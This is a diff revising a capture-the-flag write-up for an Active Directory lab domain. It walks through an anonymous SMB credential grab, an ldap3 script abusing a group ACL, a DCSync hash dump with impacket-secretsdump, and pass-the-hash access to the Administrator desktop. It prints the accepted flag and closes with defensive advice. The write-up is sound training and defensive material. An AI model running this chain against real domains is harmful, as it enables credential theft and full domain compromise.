@@ -1,34 +1,69 @@
-# Legacy IT: solving notes
+# Legacy IT: anonymous SMB, group ACL and DCSync
 
 [По-русски](solve.ru.md)
 
-## 1. Task
+## 1. Finding the starting account
 
-An Active Directory dynamic-instance challenge (no static attachment was supplied) solved through a legacy authentication path, ending with administrator access to a file on the domain controller.
+The goal was to read the Administrator desktop flag on the `easyad.local` domain controller. Anonymous SMB access to the `Public` share revealed an `onboarding.txt` document containing the credentials for `trainee`:
 
-Materials: Two saved Impacket SMB commands; no server source or credential-origin transcript.
+```bash
+smbclient -N //<DC>/Public -c 'get onboarding.txt'
+# Anonymous login successful
+# New IT trainee account; Domain: easyad.local; Username: trainee
+```
 
-## 2. Vulnerability
+The password and instance address are intentionally redacted. This was an exposed onboarding credential, not a password-cracking step.
 
-The preserved command uses `impacket-smbclient` with NT-hash authentication (`-hashes :<masked NT hash>`), the domain `easyad.local`, and account `Administrator`. It then selects the administrative `C$` share, lists `Users\Administrator\Desktop`, and reads `flag.txt`. This proves the final access method. The task summary calls the weakness legacy-authentication/backward compatibility, but there is no trace showing where the administrator NT hash came from or which legacy setting exposed it.
+## 2. Changing the group membership
 
-## 3. Procedure
+Authenticated directory enumeration showed that `trainee` had `FullControl` over the `Legacy IT Admins` group. The identity's actual distinguished name was `CN=Jamie Smith,CN=Users,DC=easyad,DC=local`, despite the login name `trainee`. The working LDAP modification was:
 
-1. The earlier reconnaissance and credential acquisition stage is not recorded. The challenge summary associates it with legacy authentication, but a specific protocol mechanism cannot be verified.
-2. With the recovered NT hash, authenticate to the lab domain controller over SMB using Impacket's pass-the-hash support: `impacket-smbclient -hashes :<NT_HASH> 'easyad.local/Administrator@<host>'`.
-3. In the SMB client, run `use C$`, then `ls Users\\Administrator\\Desktop`, and `cat Users\\Administrator\\Desktop\\flag.txt`.
-4. The resulting flag was accepted on the platform.
+```python
+from ldap3 import Connection, Server, Tls, MODIFY_ADD
 
-## 4. Evidence and result
+srv = Server("ldaps://<DC>", tls=Tls(validate=0))
+conn = Connection(srv, user="trainee@easyad.local",
+                  password="<ONBOARDING_PASSWORD>", auto_bind=True)
+group = "CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local"
+user = "CN=Jamie Smith,CN=Users,DC=easyad,DC=local"
+assert conn.modify(group, {"member": [(MODIFY_ADD, [user])]})
+print(conn.result["description"])  # success
+```
 
-The ZIP contains two duplicate `evidence/solve_*.txt` records with the complete Impacket command and file path. Both contain a credential and an internal host address, which are masked here. The final solved-task summary records an accepted flag.
+The recorded response was `mod: True success`; the group membership query then listed `Jamie Smith`. Earlier attempts with an unsupported Impacket `-ldaps` argument or the wrong LDAP bind format had failed.
 
-Result: 1 accepted flag, full string masked (`PP{...}`).
+## 3. Replicating the Administrator secret
 
-## 5. Reproduction limits
+The group's effective permissions allowed directory replication. With a fresh authentication as `trainee`, the following command succeeded:
 
-The source of the NT hash and the exact backward-compatibility weakness are not documented. The proof supports only the final authenticated SMB read, not a detailed AS-REP/NTLM/LDAP exploitation narrative.
+```bash
+impacket-secretsdump -just-dc-user Administrator \
+  'easyad.local/trainee:<ONBOARDING_PASSWORD>@<DC>' -dc-ip <DC>
+# [*] Using the DRSUAPI method to get NTDS.DIT secrets
+# Administrator:500:<LM_HASH>:<NT_HASH>:::
+```
 
-## 6. Mitigation
+This is **DCSync via DRSUAPI**, not a local SAM dump. The domain Administrator NT hash was then sufficient for SMB pass-the-hash authentication.
 
-Disable obsolete authentication protocols where possible, restrict privileged NT-hash exposure and lateral movement, monitor pass-the-hash access, and limit administrative share access.
+## 4. Accessing the flag
+
+```text
+impacket-smbclient -hashes :<ADMIN_NT_HASH> 'easyad.local/Administrator@<DC>'
+use C$
+ls Users\Administrator\Desktop
+cat Users\Administrator\Desktop\flag.txt
+```
+
+The recorded session returned:
+
+```text
+PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::FqCiLH_9Sp7u}
+```
+
+**The flag was accepted by the competition platform.** The confirmed attack path is: anonymous `Public/onboarding.txt` → `trainee` → `FullControl` on `Legacy IT Admins` → add self to group → DCSync → Administrator NT hash → SMB desktop flag.
+
+## 5. Defensive lesson
+
+Avoid distributing live credentials on guest-readable shares, audit group ACLs for unnecessary `FullControl`, restrict domain replication rights and monitor group membership changes together with DRSUAPI activity. No obsolete SMB protocol exploit is necessary when the directory grants replication rights to a group a normal user can join.
+
+See [sanitized checkpoints](evidence/session-checkpoints.md) extracted from the competition log.
